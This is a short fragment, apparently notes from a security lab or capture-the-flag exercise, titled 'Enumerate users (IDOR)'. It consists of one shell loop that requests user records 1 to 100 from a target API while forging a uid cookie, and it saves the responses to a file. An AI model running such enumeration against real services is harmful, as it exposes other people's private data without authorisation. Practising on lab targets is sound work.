1. Enumerate users (IDOR)
```shell-session
for i in {1..100}; do curl -s "http://94.237.48.12:39808/api.php/user/$i" -H "Cookie: PHPSESSID=d8sskie22digjhc13fra80lh62; uid=$i"; echo; done >> wow.txt
```

